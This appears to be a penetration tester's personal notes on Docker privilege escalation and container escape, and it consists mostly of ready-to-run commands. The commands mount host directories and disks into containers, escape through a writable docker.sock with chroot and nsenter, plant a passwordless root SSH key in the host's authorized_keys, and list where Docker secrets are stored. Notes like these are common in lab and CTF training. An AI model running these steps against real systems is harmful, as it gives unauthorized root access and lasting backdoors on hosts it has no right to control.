https://gtfobins.github.io/gtfobins/docker/


---
#### Docker.sock
```
find / -name "docker.sock" 2>/dev/null
```

>/run/docker.sock


---

[https://www.hackingarticles.in/docker-privilege-escalation/](https://www.hackingarticles.in/docker-privilege-escalation/)

![[Pasted image 20221115144437.png]]

![[Pasted image 20221115144455.png]]

```bash - kali
docker run -v /root:/mnt -it alpine
```

```bash - kali
docker run -v /etc/:/mnt -it alpine
```

```bash - kali
cd /mnt
```

```bash - kali
ls
```

#### Privileged

When a docker container is running in privileged mode and root access is acquired, escaping the container is then possible. We try to mount the / directory of the host, inside the docker container. But first, we need to execute the following command, in order to get the name of the partition that we are going to mount.

```bash - target
lsblk
```

![[Pasted image 20221115144518.png]]

Let's try to mount the partition sda2 into the directory /mnt .

```bash - target
mount /dev/sda2 /mnt -o loop6
```

```bash - target
ls -l /mnt
```

![[Pasted image 20221115144531.png]]

The / directory is mounted successfully. We create SSH keys for the host user root .

```bash - target
ssh-keygen -f /mnt/root/.ssh/id_rsa -P ""
```

```bash - target
cp /mnt/root/.ssh/id_rsa.pub /mnt/root/.ssh/authorized_keys
```

```bash - target
cat /mnt/root/.ssh/id_rsa
```

We store the key in a file locally and name it id_rsa and give the appropriate permissions.

[[Port 22 - SSH  ~#id_rsa]]

![[Pasted image 20221115144550.png]]

#### /var/run/docker.sock is writable
```bash - kali
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
```

```bash - kali
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

#### Secrets
Try to see Docker secret locations or names:
```
$ docker secret ls
```

Linux Docker Secrets Locations:
```
/run/secrets/<secret_name>
```

Windows Docker Secrets Locations:
```
C:\ProgramData\Docker\internal\secrets
```

```
C:\ProgramData\Docker\secrets
```


---

Notice the hidden .dockerenv file.  Given that and the host name "0873e8062560", we are likely inside of a docker container.

![[Pasted image 20220331134954.png]]

```bash - target
fdisk -l
```

![[Pasted image 20220331135403.png]]

```bash - target
mkdir /mnt/own
```

```bash - target
mount /dev/sda1 /mnt/own
```

```bash - target
cd /mnt/own
```

```bash - target
cd root
```

```bash - target
ls -lah
```



